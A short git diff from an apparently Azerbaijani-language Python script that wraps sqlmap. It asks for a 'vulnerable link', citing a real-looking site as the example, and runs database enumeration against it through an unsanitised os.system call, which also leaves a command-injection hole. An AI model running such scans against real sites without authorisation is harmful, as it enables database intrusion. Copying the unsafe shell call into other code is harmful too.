@@ -16,7 +16,7 @@ boslugu olan link misali:  https://suesupriano.com/article.php?id=25
 """)
 
 emr_no= input("emeliyatin nomresini yazin : ")
-if(emr_no=="1 "):
+if(emr_no=="1"):
     bosluglu_link = input ("boslugu olan linki yazin : ")
     os.system("sqlmap -u " + bosluglu_link + "--dbs --random-agent")
 elif(emr_no=="2"):
